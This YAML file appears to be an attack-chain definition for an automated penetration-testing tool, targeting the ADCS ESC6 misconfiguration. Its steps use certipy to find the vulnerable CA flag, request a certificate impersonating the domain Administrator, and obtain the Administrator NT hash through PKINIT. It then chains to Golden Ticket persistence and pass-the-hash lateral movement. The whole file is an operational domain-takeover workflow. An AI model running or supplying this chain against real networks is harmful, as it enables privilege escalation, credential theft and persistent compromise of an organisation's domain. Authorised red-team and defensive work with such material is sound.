id: esc6-adcs-edituf-global
name: "ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 global flag"
description: >
  The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set globally → SAN
  attributes are accepted in any cert request, regardless of the template's
  ENROLLEE_SUPPLIES_SUBJECT setting. Every enrollable template becomes an
  ESC1 candidate.
tags: [adcs, esc6, priv-esc, certificates]
difficulty: medium

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password
    required: true

steps:
  - id: find_esc6
    name: "Confirm CA has the EDITF flag (certipy CA inspection)"
    command_ref: certipy-find
    inputs:
      ip: "${dc_ip}"
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
    notes: |
      Look at the CA section: `User Specified SAN: Enabled` and/or
      `Vulnerabilities: ESC6`. May 2022 patches set this to Disabled by
      default — affects mostly older / mis-configured deployments.
    capture:
      - var: ca_name
        regex: 'CA Name\s*:\s*(.+?)$'
        match: first
      - var: any_template
        regex: 'Template Name\s*:\s*(\S+)'
        match: first

  - id: request_with_san
    name: "Request a cert with Administrator UPN in SAN (any template)"
    command_ref: certipy-esc6
    requires: [ca_name, any_template]
    inputs:
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      dc-ip: "${dc_ip}"
      ca_name: "${ca_name}"
    notes: |
      Use ANY template you can enroll in — User, Machine, anything. The
      EDITF flag globally accepts your `-upn administrator@<domain>`.
    capture:
      - var: pfx_file
        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
        match: first

  - id: pkinit_auth
    name: "PKINIT auth → Administrator NT hash"
    command_ref: certipy-auth
    requires: [pfx_file]
    inputs:
      pfx_file: "${pfx_file}"
      ip: "${dc_ip}"
    capture:
      - var: dc_nt_hash
        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
        match: first

references:
  - title: "Certified Pre-Owned — ESC6"
    url:   "https://posts.specterops.io/certified-pre-owned-d95910965cd2"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'dc_nt_hash captured'
    reason: 'Golden Ticket.'
  - chain: pth-lateral-spread
    when:   'dc_nt_hash captured'
    reason: 'Spread DA hash.'
